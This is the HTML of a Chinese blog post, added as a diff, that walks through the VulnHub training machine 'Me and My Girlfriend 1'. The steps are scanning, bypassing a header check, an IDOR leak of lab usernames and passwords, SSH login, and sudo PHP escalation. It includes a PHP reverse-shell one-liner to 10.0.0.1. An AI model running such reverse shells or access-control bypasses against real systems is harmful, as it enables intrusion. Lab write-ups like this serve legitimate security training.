@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[vulnhub]Me and My Girlfriend 1靶机 | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[vulnhub]Me and My Girlfriend 1靶机</h2>
+            <div class="post-date">2020-02-04</div>
+            
+            <div class="post-content">
+              <p><strong>1。确定目标</strong><br>
+目标为192.168.0.179<br>
+<strong>2。端口扫描</strong><br>
+只开放了22和80<br>
+<img src="https://guokeya.github.io/post-images/1580809667151.png" alt="" loading="lazy"></p>
+<!-- more -->
+<p><strong>3。web目录扫描</strong><br>
+存在robots.txt/misc目录/config目录<br>
+存在目录遍历。目录下的两个php访问都是空白。<br>
+<img src="https://guokeya.github.io/post-images/1580809805996.png" alt="" loading="lazy"><br>
+robots.txt得到提示。没啥用<br>
+<code>Great! What you need now is reconn, attack and got the shell</code><br>
+访问index.php。提示只允许本地访问<br>
+<img src="https://guokeya.github.io/post-images/1580809878360.png" alt="" loading="lazy"><br>
+burp挂上xff头。访问<br>
+就一个主页。一个修改密码。一个注销<br>
+发现。存在id。<br>
+<img src="https://guokeya.github.io/post-images/1580809968873.png" alt="" loading="lazy"><br>
+尝试下sql注入。并不行<br>
+修改id为1。存在越权漏洞。<br>
+后台应该是selct * from user where id=intval($_GET['id']);<br>
+没进行任何权限控制。直接带入查询<br>
+<img src="https://guokeya.github.io/post-images/1580810029802.png" alt="" loading="lazy"><br>
+得到用户名密码</p>
+<pre><code>+----+-----------------+----------------+-------------+
+| id | name            | username       | password    |
++----+-----------------+----------------+-------------+
+|  1 | Eweuh Tandingan | eweuhtandingan | skuyatuh    |
+|  2 | Aing Maung      | aingmaung      | qwerty!!!   |
+|  3 | Sunda Tea       | sundatea       | indONEsia   |
+|  4 | Sedih Aing Mah  | sedihaingmah   | cedihhihihi |
+|  5 | Alice Geulis    | alice          | 4lic3       |
+|  9 | Abdi Kasep      | abdikasepak    | dorrrrr     |
+| 12 | 123             | 123            | 123         |
++----+-----------------+----------------+-------------+
+</code></pre>
+<p>到这里就没什么思路了。现在只有用户名密码。<br>
+尝试用这些用户名密码去爆破ssh<br>
+成功。用户名alice密码4lic3<br>
+<img src="https://guokeya.github.io/post-images/1580810336358.png" alt="" loading="lazy"><br>
+看到了第一个flag。接着信息收集<br>
+数据库居然是root用户。<br>
+<img src="https://guokeya.github.io/post-images/1580810381410.png" alt="" loading="lazy"><br>
+可以roto用户权限执行php<br>
+<img src="https://guokeya.github.io/post-images/1580810417044.png" alt="" loading="lazy"><br>
+php反弹shell<br>
+<code>php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i&lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</code><br>
+<img src="https://guokeya.github.io/post-images/1580810629956.png" alt="" loading="lazy"><br>
+还有一个思路。我们使用mysql的密码去登陆root<br>
+可以登陆成功<br>
+直接sudo su</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/EfzSPkBWE/" class="tag">
+                    渗透测试
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/bjdctf-web-ti-jie/">
+                  <h3 class="post-title">
+                    BJDCTF  Web题解
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
